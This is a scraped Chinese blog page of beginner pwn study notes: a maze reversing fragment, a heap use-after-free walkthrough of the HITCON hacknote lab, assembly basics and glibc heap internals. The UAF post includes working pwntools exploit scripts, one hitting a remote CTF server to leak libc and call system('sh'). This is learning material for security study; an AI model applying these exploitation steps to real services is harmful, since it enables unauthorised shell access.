1, 1, 1, 1, 1, 1, 1  .data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.data:0000000000202020                 dd 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0.data:0000000000202020 _data           ends

调整格式注意这里就好,15个字符一行		
100,115,119,97 d s w a              对应了前后左右四个键
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051__int64 sub_940()&#123;  int v0; // eax  int v2; // [rsp+8h] [rbp-218h]  int v3; // [rsp+Ch] [rbp-214h]  char v4[520]; // [rsp+10h] [rbp-210h] BYREF  unsigned __int64 v5; // [rsp+218h] [rbp-8h]  v5 = __readfsqword(0x28u);  v3 = 0;  memset(v4, 0, 0x200uLL);  _isoc99_scanf(&amp;unk_1278, v4, v4);  while ( 1 )  &#123;    do    &#123;      v2 = 0;      sub_86C();      v0 = v4[v3];      if ( v0 == 100 )      &#123;        v2 = sub_E23();      &#125;      else if ( v0 &gt; 100 )      &#123;        if ( v0 == 115 )        &#123;          v2 = sub_C5A();        &#125;        else if ( v0 == 119 )        &#123;          v2 = sub_A92();        &#125;      &#125;      else      &#123;        if ( v0 == 27 )          return 0xFFFFFFFFLL;        if ( v0 == 97 )          v2 = sub_FEC();      &#125;      ++v3;    &#125;    while ( v2 != 1 );    if ( dword_202AB0 == 2 )      break;    ++dword_202AB0;  &#125;  puts(&quot;success! the flag is flag&#123;md5(your input)&#125;&quot;);  return 1LL;&#125;





2BABYRE怎么转换数据把那个数组数据拿出来?
代码做了加密,要解一下
https://blog.rois.io/2021/rctf-2021-official-writeup-2/
函数__readfsqword函数
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/" title="pwn入门-15-堆利用之Use-After-Free">pwn入门-15-堆利用之Use-After-Free</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-06T05:21:37.000Z" title="发表于 2023-03-06 13:21:37">2023-03-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:42.105Z" title="更新于 2023-06-09 20:27:42">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">漏洞原理复制的wiki的:
简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。
内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。

而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。
自己的理解​		我理解的就是free后没有清空指针,导致还可以继续利用,利用的方式就是申请到free的bins然后覆盖上数据,借此修改一些函数指向等
​		4.16补充: 其实利用方式很多,总的来说是free后要对它能进行一定的操作,然后free前的功能还能用,比如puts等,就会导致问题.
例子​		这是wiki上的例子,可以编译一下然后看看效果
12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct name &#123;  char *myname;  void (*func)(char *str);&#125; NAME;void myprint(char *str) &#123; printf(&quot;%s\n&quot;, str); &#125;void printmyname() &#123; printf(&quot;call print my name\n&quot;); &#125;int main() &#123;  NAME *a;  a = (NAME *)malloc(sizeof(struct name));  a-&gt;func = myprint;  a-&gt;myname = &quot;I can also use it&quot;;  a-&gt;func(&quot;this is my function&quot;);  // free without modify  free(a);  a-&gt;func(&quot;I can also use it&quot;);  // free with modify  a-&gt;func = printmyname;  a-&gt;func(&quot;this is my function&quot;);  // set NULL  a = NULL;  printf(&quot;this pogram will crash...\n&quot;);  a-&gt;func(&quot;can not be printed...&quot;);&#125;

​		细节注意:编译的时候要指定好libc,不然如果使用的libc版本过高就会有问题,之前一直在踩这个坑…而且如果事先不指定,编译完再patchelf的话也会有问题,(目前还不懂)
​	gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c
​		
123456root@VM-24-10-ubuntu:/home/ubuntu/heap/useafter# ./a.outthis is my functionI can also use itcall print my namethis pogram will crash...Segmentation fault (core dumped)

​			a &#x3D; NULL的话 , free的过程是怎样的? NULL修改了什么呢?
看雪的一个例子具体看雪的链接找不到了..
123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt; void func1()&#123;    printf(&quot;func1\n&quot;);&#125; void hack()&#123;    printf(&quot;hack\n&quot;);&#125; struct Pfunc&#123;    void (*p)();&#125;;  int main()&#123;    struct Pfunc* lpfunc = malloc(8);    lpfunc-&gt;p = func1;    lpfunc-&gt;p();     free(lpfunc);      long* hack_point = malloc(8);    *hack_point = hack;     lpfunc-&gt;p();    return 0;&#125;

​		这个函数就是先申请一个Pfunc结构体指针,分配了一块堆空间,然后把它结构体成员p赋值为一个函数地址,就可以调用了. 然后将这个结构体释放,又申请了一个新的堆空间,赋值为另外一个函数,原先的结构体指针仍然可以利用 ,
​		那free和没free有什么差别呢????????? free的话,是把这块空间标记为空闲可用,所以说应该还有一个地方,存储着这块空间的管理结构,但是这块空间本身是没有改变的.
HITCON-training 中的 lab 10 hacknotemain
​		获取用户的输入,然后根据输入进行不同的选择
123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  char buf; // [esp+8h] [ebp-10h]  unsigned int v5; // [esp+Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      read(0, &amp;buf, 4u);      v3 = atoi(&amp;buf);      if ( v3 != 2 )        break;      del_note();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        print_note();      &#125;      else      &#123;        if ( v3 == 4 )          exit(0);LABEL_13:        puts(&quot;Invalid choice&quot;);      &#125;    &#125;    else    &#123;      if ( v3 != 1 )        goto LABEL_13;      add_note();    &#125;  &#125;&#125;

 123456789101112int menu()&#123;  puts(&quot;----------------------&quot;);  puts(&quot;       HackNote       &quot;);  puts(&quot;----------------------&quot;);  puts(&quot; 1. Add note          &quot;);  puts(&quot; 2. Delete note       &quot;);  puts(&quot; 3. Print note        &quot;);  puts(&quot; 4. Exit              &quot;);  puts(&quot;----------------------&quot;);  return printf(&quot;Your choice :&quot;);&#125;

add
​		notelist这个链表存储内容,链表的每个节点分了两部分,第一部分4字节,存储print_note_content函数地址,第二部分也是一个指针,指向存储malloc的数据的chunk的地址.
​		例如申请一个8字节大小的content,会得到

12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123;  _DWORD *v0; // ebx  signed int i; // [esp+Ch] [ebp-1Ch]  int size; // [esp+10h] [ebp-18h]  char buf; // [esp+14h] [ebp-14h]  unsigned int v5; // [esp+1Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  if ( count &lt;= 5 )  //最多分配5个  &#123;    for ( i = 0; i &lt;= 4; ++i )    &#123;      if ( !notelist[i] )      &#123;        notelist[i] = malloc(8u);  //分配一个notelist节点        if ( !notelist[i] )        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        *(_DWORD *)notelist[i] = print_note_content; //存储put函数        printf(&quot;Note size :&quot;);        read(0, &amp;buf, 8u);        size = atoi(&amp;buf);        v0 = notelist[i]; //v0等于notelist的第一个8字节,存储put函数        v0[1] = malloc(size); // v0第二个字节,存储真正要存储的数据        if ( !*((_DWORD *)notelist[i] + 1) ) //看有没有分配成功?        &#123;          puts(&quot;Alloca Error&quot;);          exit(-1);        &#125;        printf(&quot;Content :&quot;);        read(0, *((void **)notelist[i] + 1), size);        puts(&quot;Success !&quot;);        ++count;        return __readgsdword(0x14u) ^ v5; //这是啥??      &#125;    &#125;  &#125;  else  &#123;    puts(&quot;Full&quot;);  &#125;  return __readgsdword(0x14u) ^ v5;&#125;

delete
1234567891011121314151617181920212223unsigned int del_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;); //输入要释放的index  read(0, &amp;buf, 4u);  v1 = atoi(&amp;buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( notelist[v1] )   &#123;    free(*((void **)notelist[v1] + 1));    free(notelist[v1]);  // 释放后但没有清零!! 漏洞点    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;

12345678910111213141516171819unsigned int print_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, &amp;buf, 4u);  v1 = atoi(&amp;buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( notelist[v1] )   // 释放后仍然可以调用! 漏洞点!!    (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);  return __readgsdword(0x14u) ^ v3;&#125;

思路​		free后没有清空notelist的内容,也就是说,还可以继续调用print_note函数,也就是可以调用notelist对应的块的print_note_content函数,如果能够将这个函数修改成后门函数或者system函数的话,就可以getshell.
​		问题是如何获取这一块空间进行修改呢?, 存储函数地址的这一块空间本质上也是普通的一块堆的空间,可以在释放后重新申请到,所以可以进行释放再申请,但是释放了的话,再申请一次,第一个释放的8字节存放函数地址的chunk还是会被申请为存放函数地址的空间.
​		不过我们可以最开始连续申请两个notelist,然后再释放,这样的话,第二个notelist存放函数的chunk,就可以被申请作为数据的chunk了
1.申请note0和note1,大小随意,不是8及以下就行, 如16
​		不能是8及以下是因为不能和存放函数的chunk进入同一个fastbin的链表,不然会影响,
​		注意,此时会有4个chunk, 2个是用来存放put和content指针的, 两个是存放数据的
2.释放note0和note1,这时候有4个bins了,其中0x10大小的就是存放put和content指针的
123456789pwndbg&gt; binsfastbins0x10: 0x804b028 —▸ 0x804b000 ◂— 0x00x18: 0x804b038 —▸ 0x804b010 ◂— 0x00x20: 0x00x28: 0x00x30: 0x00x38: 0x0  


申请一个大小为8的note2,这个时候就会分别用到0x10的两个fastbin
而第二个0x10的bin,其实就是note1的存放函数地址的指针,修改为后们函数地址后再通过uaf进行print_note中的函数调用就可以getshell了


1234567891011121314151617181920pwndbg&gt; binsfastbins0x10: 0x00x18: 0x804b038 —▸ 0x804b010 ◂— 0x00x20: 0x0    pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x804b000Size: 0x11Free chunk (fastbins) | PREV_INUSEAddr: 0x804b010Size: 0x19fd: 0x00Allocated chunk | PREV_INUSEAddr: 0x804b028Size: 0x11


此时,我们在申请的这个note2中,填入magic函数的地址,就覆盖了note0的put和content指针,

123x/4wx 0x804b0000x804b000:	0x00000000	0x00000011	0x61616161	0x0a616161为什么一开始不是数据呢,一开始是存放的chunk的结构等信息


再调用note0的put,就成功调用了magic函数!exp

1234567891011121314151617181920212223242526from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./hacknote&quot;)def add(length,context):    io.sendlineafter(&quot;choice&quot;,&quot;1&quot;)    io.sendlineafter(&quot;size&quot;,length)    io.sendlineafter(&quot;Content&quot;,context)def delete(index):    io.sendlineafter(&quot;choice&quot;,&quot;2&quot;)    io.sendlineafter(&quot;Index&quot;,index)def Print(index):    io.sendlineafter(&quot;choice&quot;,&quot;3&quot;)    io.sendlineafter(&quot;Index&quot;,index)add(&quot;16&quot;,b&quot;aaa&quot;)add(&quot;16&quot;,b&quot;bbb&quot;)delete(&quot;0&quot;)delete(&quot;1&quot;)add(&quot;8&quot;,p32(0x08048986))Print(&quot;0&quot;)io.recv(1024)io.recv(1024)io.recv(1024)

​	几个细节问题,比如为什么不能用数字什么的,先看看比较官方的exp怎么写的吧
123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;1&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(size))    r.recvuntil(&quot;:&quot;)    r.sendline(content)def delnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;2&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))def printnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;3&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive()

​		修改自己的exp
​		1.数字都给加上str() 转换一下就可以了
​		2.输入的字符串可以把b去了
这下顺眼多了
12345678910111213141516171819202122232425from pwn import *context.log_level= &quot;debug&quot;io = process(&quot;./hacknote&quot;)def add(length,context):    io.sendlineafter(&quot;choice&quot;,&quot;1&quot;)    io.sendlineafter(&quot;size&quot;,str(length))    io.sendlineafter(&quot;Content&quot;,context)def delete(index):    io.sendlineafter(&quot;choice&quot;,&quot;2&quot;)    io.sendlineafter(&quot;Index&quot;,str(index))def Print(index):    io.sendlineafter(&quot;choice&quot;,&quot;3&quot;)    io.sendlineafter(&quot;Index&quot;,str(index))add(16,&quot;aaa&quot;)add(16,&quot;bbb&quot;)delete(0)delete(1)add(8,p32(0x08048986))Print(0)io.interactive()#io.recv(1024)

泄露libc​		没有后门函数,那就需要泄露libc地址后system、getshell. 把调用的函数地址修改成puts函数的地址,那怎么传参数呢? 参数要用栈,
    #### puts

​		这是把堆当成栈来用了吗… 也不是, 这个不能用plt的puts来打印,因为没有栈传递参数,但它本身是有一个打印的函数的,正常情况下是打印存储的数据的,如下图,0x0804862b是打印函数,调用这个函数打印0x0804b018地址存储的数据,所以我们可以把这里改成puts的got表地址,就可以打印出来它的内容了

​		puts_addr &#x3D; u32(io.recv(4)) 这样写还有问题
123puts_addr = io.recv(4)print(&quot;here:&quot;)print(puts_addr)
​		调试一下就会发现有问题,打印的地方不对,在接收这个之前,其实还会接收到那一堆的提示信息,所以先把提示信息接收到,再接收地址即可
12345Print(0)io.recv()puts_addr = u32(io.recv(4))print(&quot;here:&quot;)print(hex(puts_addr))

​		
后面再继续申请的话,编号是多少呢?
123456add(16,&quot;aaa&quot;)add(16,&quot;bbb&quot;)delete(0)delete(1)add(8,p32(0x804862B) + p32(elf.got[&quot;puts&quot;])) //编号是多少???





123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)myelf = ELF(&#x27;./hacknote&#x27;)mylibc = ELF(&#x27;./libc_32.so.6&#x27;)io = remote(&#x27;chall.pwnable.tw&#x27;,10102)def add_note(size,content):    io.recvuntil(&quot;choice :&quot;)    io.sendline(&quot;1&quot;)    io.recvuntil(&quot;size :&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content :&quot;)    io.sendline(content)def del_note(index):    io.recvuntil(&quot;choice :&quot;)    io.sendline(&quot;2&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))def print_note(index):    io.recvuntil(&quot;choice :&quot;)    io.sendline(&quot;3&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))add_note(64,&quot;12&quot;)add_note(32,&quot;12&quot;)del_note(0)add_note(64,&quot;45&quot;)print_note(2)libc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0sys_addr = libc_addr + mylibc.symbols[&#x27;system&#x27;]# add_note(8,&quot;12&quot;)# add_note(8,&quot;34&quot;)# del_note(3)# del_note(4)del_note(0)del_note(1)add_note(8,p32(sys_addr)+&quot;;sh\x00&quot;)print_note(0)io.interactive()





libc_addr &#x3D; u32(io.recv(8)[4:8]) - 0x1b07b0sys_addr &#x3D; libc_addr + libc.symbols[‘system’]
首先,有随机化,这个随机化是什么? 所以必须每次要接收到地址才行,不能用之前的
123456789101112131415161718192021222324252627282930313233343536373839404142def Print(index):    #io.sendlineafter(&quot;choice&quot;,&quot;3&quot;)    #io.sendlineafter(&quot;Index&quot;,str(index))    io.recvuntil(&quot;choice :&quot;)    io.sendline(&quot;3&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))这玩意有什么区别吗....          io.sendlineafter(&quot;choice :&quot;,&quot;3&quot;)    io.sendlineafter(&quot;Index :&quot;,str(index))      改成这样也可以..........卧槽了.......尼玛范德萨发爱上,要骂人了                   [DEBUG] Received 0xc6 bytes:    b&#x27;\n&#x27;    b&#x27;----------------------\n&#x27;    b&#x27;       HackNote       \n&#x27;    b&#x27;----------------------\n&#x27;    b&#x27; 1. Add note          \n&#x27;    b&#x27; 2. Delete note       \n&#x27;    b&#x27; 3. Print note        \n&#x27;    b&#x27; 4. Exit              \n&#x27;    b&#x27;----------------------\n&#x27;    b&#x27;Your choice :&#x27;[DEBUG] Sent 0x2 bytes:    b&#x27;3\n&#x27;[DEBUG] Received 0x7 bytes:    b&#x27;Index :&#x27;[DEBUG] Sent 0x2 bytes:    b&#x27;2\n&#x27;Traceback (most recent call last):  File &quot;2.py&quot;, line 63, in &lt;module&gt;    libc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/context/__init__.py&quot;, line 1597, in setter    return function(*a, **kw)  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 353, in routine    (&quot;big&quot;,    False):  bu&#125;[endian, signed](number, 3)  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 320, in routine    return struct_op(data)[0]struct.error: unpack requires a buffer of 4 bytes[*] Closed connection to chall.pwnable.tw port 10102

我知道了………..如果不在这之后发..收到的就是后面的那个东西了…….
choice : 会收到 空格和:作为recv的值……
调试wiki里有调试,可以学一下
问题​		如何进行调试源代码? 指定源代码一行一行走?
​		gdb调试的时候r了,ctrl+c了,怎么继续执行    好像没太有办法,可以下断点!也挺好用的
​		为什么释放的chunk是0x18 也就是24呢,不是16吗 和对其有关? 
​		怎么在gdb里面发送 p32 p64这种数据呢?  可以用eb命令等 直接修改内存就可以了
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/" title="pwn入门-16-汇编反汇编基础">pwn入门-16-汇编反汇编基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-03T13:54:42.000Z" title="发表于 2023-03-03 21:54:42">2023-03-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:45.317Z" title="更新于 2023-06-09 20:27:45">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">常用汇编指令lea 加载有效地址
​	lea   eax, [ebx+8]  将ebx+8存储的内存地址 +8 传给eax
​	mov eax, [ebx+8]  将ebx+8内存地址指向的数据 传给eax
cmp
算数运算sub 减
add 加
inc +1
dec -1
mul 乘
div 除
条件指令及跳转指令https://blog.csdn.net/counsellor/article/details/81005101
jmp  无条件跳转                                      p74-76
这几个都是根据标志位跳转
jz 如果ZF标志位置位则跳转  等于
jnz 如果ZF标志位被清除则跳转 不等于
je 等于跳转
jg 有符号大于则跳转
test eax,eax 检测目标值是否为0 ,即两个操作数按位与运算,为0的话设置标志位ZF为1,否则为0(不修改使用的操作数)
cmp eax,ebx 如果两个参数相等,ZF标志位置位
一般在cmp指令后用je，test指令后用jz
函数使用的call
leave
enter
ret
https://www.codenong.com/10483544/
全局变量与局部变量1234567891011#include &lt;stdio.h&gt;int i = 1;int main()&#123;	int j =2;	printf(&quot;this is:%d %d\n&quot;,i,j);	return 0;&#125;




全局变量i通过内存地址引用,局部变量通过栈地址引用
算数运算12345678910111213#include &lt;stdio.h&gt;int main()&#123;	int i = 10;  int j=2;  int k;  i = i +2;  k = i/j;	printf(&quot;this is:%d %d %d\n&quot;,i,j,k);	return 0;&#125;



123456789101112131415.text:000000000000064A                 push    rbp.text:000000000000064B                 mov     rbp, rsp.text:000000000000064E                 sub     rsp, 10h.text:0000000000000652                 mov     [rbp+var_C], 0Ah          ; int i =10.text:0000000000000659                 mov     [rbp+var_8], 2						;int j=2;.text:0000000000000660                 add     [rbp+var_C], 2						; i = i +2;.text:0000000000000664                 mov     eax, [rbp+var_C]         ; 把i放到eax中当作被除数.text:0000000000000667                 cdq.text:0000000000000668                 idiv    [rbp+var_8]              ;j是除数.text:000000000000066B                 mov     [rbp+var_4], eax         ;结果放到k中.text:000000000000066E                 mov     ecx, [rbp+var_4]		;k.text:0000000000000671                 mov     edx, [rbp+var_8]		;j.text:0000000000000674                 mov     eax, [rbp+var_C]		;i.text:0000000000000677                 mov     esi, eax					;i.text:0000000000000679                 lea     rdi, format     ; &quot;this is:%d %d %d\n&quot;



识别if语句• if语句的结构 
​	– if语句主要由判断语句和跳转语句构成 
12345678910111213141516#include &lt;stdio.h&gt;int main()&#123;	int i = 3;  if(i == 3)  &#123;    	printf(&quot; this is 3&quot;);  &#125;else&#123;    	printf(&quot; this is not 3&quot;);  &#125;	return 0;&#125;





识别循环for和while循环差距不大
for循环的4个组件 
​	– 初始化、比较、执行指令、递增或递减
123456789101112#include &lt;stdio.h&gt;int main()&#123;	int n = 0;  for(int i=1;i&lt;101;i++)    n += i;     printf(&quot;the sum is: %d\n&quot;,n);	return 0;&#125;


识别结构体问题一开始执行的是什么玩意??
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/" title="pwn入门-14-基础知识查缺补漏1">pwn入门-14-基础知识查缺补漏1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-03T11:17:35.000Z" title="发表于 2023-03-03 19:17:35">2023-03-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:27:40.147Z" title="更新于 2023-06-09 20:27:40">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">寄存器

EFLAGS 状态寄存器 32位https://article.itxueyuan.com/1DeLA0
​		每一位都是一个标识,置位为1或清除为0

几个重要的标志位​		• ZF – 运算结果为0，ZF被置位，否则被清除 
​		• CF – 结果相对于目标操作数太大或者太小时CF被置位，否则被清除 
​		• SF – 运算结果为负，或者运算结果最高位为1时，SF被 置位 
​		• TF – 用于调试，当它被置位时，x86处理器每次只执行一条指令
调用约定
https://www.codenong.com/10483544/
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="pwn入门-13-堆入门基础">pwn入门-13-堆入门基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-28T10:35:20.000Z" title="发表于 2023-02-28 18:35:20">2023-02-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-07T06:08:06.842Z" title="更新于 2023-10-07 14:08:06">2023-10-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">glibc的堆管理实现arena
​	指的是堆内存区域本身,并非结构	
​	主线程的main arena通过sbrk创建
​	其他线程arena通过mmap创建
malloc_state
​	管理arena的核心结构,包括堆的状态信息,bins链表等
​	main arena对应的malloc_state结构存储在glibc的全局变量中
​	其他线程的arena对应的malloc_state存储在arena本身
bins
​	用来管理空闲内存块,通常使用链表结构来进行组织
chunks
​	内存块的结构
chunks​		用户请求的空间. 



prev_size &#x2F; prev_data： 
• 如果前一个chunk是allocated chunk(P&#x3D;1)，则此字段属于前一个chunk可用的data部分
• 如果前一个chunk是free chunk(P&#x3D;0)，则此字段表示前一个chunk的size(prev_size)
标志位（size字段的低3bit） 
• N：NON_MAIN_ARENA flag，表示chunk是否属于主线程
• M：IS_MMAPPED flag，表示是否由mmap分配
• P：PREV_INUSE flag，前一个chunk是否处于使用状态
如果当前chunk已经被free到bin中，
• fd：指向bin中后一个空闲块的指针
• bk：指向bin中前一个空闲块的指针
（后一个和前一个均不一定是物理相邻的）
如果当前chunk已经被free到large bin（后面马上会提到）中，
• fd_nextsize：指向large bin中后一个与自己大小不同的chunk的指针
• bk_nextsize：指向large bin中前一个与自己大小不同的chunk的指针
大小对齐
在glibc中，对齐由malloc.c中的request2size宏实现。可以简单将该操作理解为下表中的映射，即：实际size &#x3D; 请求的size+8后对应的下一个0x10对齐的值
这里应该还考虑了下一个chunk的复用,那万一复用不了呢?


free chunk

allocated chunk

下一个chunk的prev_size也可以被用来存放数据,因为只有前一个chunk是free的时候这个字段才有意义
案例顺便学一下怎么调试源码
指定libc版本编译 https://blog.csdn.net/mo4776/article/details/119837501
-Wl,–dynamic-linker&#x3D;&#x2F;动态连接器的路径&#x2F;ld-linux-x86-64.so.2
https://blog.csdn.net/bandaoyu/article/details/121476940
gcc -Wl,-rpath&#x3D;’&#x2F;my&#x2F;lib’,-dynamic-linker&#x3D;’&#x2F;my&#x2F;lib&#x2F;ld-linux.so.2’
gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c
